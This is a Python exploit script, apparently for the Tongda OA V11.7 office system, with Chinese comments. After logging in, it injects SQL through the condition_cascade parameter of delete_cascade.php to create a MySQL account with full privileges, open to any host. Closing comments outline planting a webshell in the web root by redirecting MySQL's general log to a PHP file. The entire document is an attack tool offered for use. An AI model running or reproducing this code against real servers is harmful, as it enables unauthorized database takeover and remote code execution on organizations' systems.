import re
import requests
import base64
import time

s = requests.session() # 初始化requests.sessionh()会话对象，保持cookie

def login(host,username,password):
    # UNAME=chenqiang&PASSWORD=&encode_type=1
    url_login = host +"logincheck.php"
    passwd =base64.b64encode(password.encode())
    data={
        'UNAME':username,
        'PASSWORD':passwd,
        'encode_type':1
    }
    res = s.post(url=url_login,data=data,verify=False)
    if "正在进入OA系统" in res.text:
        print("[*] 登录成功")
    else:
        print("[-] 登录失败")
        exit()
    set_cookie = res.headers['Set-Cookie']
    PHPSESSION = re.findall(r'PHPSESSID=(.*?);',str(res.headers))[0]
    print("成功获得cookie：PHPSESSID=",PHPSESSION,sep='')

def getshell(host,username,password):
    login(host,username,password)
    shell_url = host +"general/hr/manage/query/delete_cascade.php"
    add_mysqluser = "?condition_cascade=grant all privileges ON mysql.* TO 'abc123'@'%' IDENTIFIED BY 'abc123@abc123' WITH GRANT OPTION"
    add_mysqluser_url = shell_url + add_mysqluser
    res = s.get(add_mysqluser_url)
    print("[!] 正在新增mysql数据库账户······")
    time.sleep(3)
    if '信息删除成功！' in res.text:
        print("[*] Mysql数据库已新增账户abc123:abc123@abc123")
        print("请使用navicat连接3336端口")
    else:
        print("[-] 漏洞检测失败")

if __name__ == "__main__":
    print("[->] 正在测试V11.7后台SQL注入漏洞&数据库写webshell")
    host = input("请输入目标URL地址：")
    username = input("请输入username：")
    password = input("请输入password：")
    getshell(host,username,password)


# 通过数据库写webshell方法有很多:
# select @@basedir可以查询绝对路径：C:\TDOA11.7\mysql5\
# 那通达OA的web目录就是C:/TDOA11.7/webroot
# select @@basedir
# set global general_log='on';
# SET global general_log_file='c:/TDOA11.7/webroot/aaa.php';
# SELECT '一句话木马';